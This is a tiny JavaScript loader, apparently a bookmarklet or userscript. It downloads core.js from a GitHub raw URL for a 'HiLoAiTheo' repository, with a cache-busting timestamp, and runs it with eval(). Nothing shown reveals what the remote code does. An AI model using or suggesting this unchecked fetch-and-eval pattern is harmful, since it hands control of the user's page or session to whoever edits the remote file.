(async function(){

const url =
"https://raw.githubusercontent.com/theosual30-bot/HiLoAiTheo/main/core.js?t=" + Date.now();

const res = await fetch(url);

const code = await res.text();

eval(code);

})();
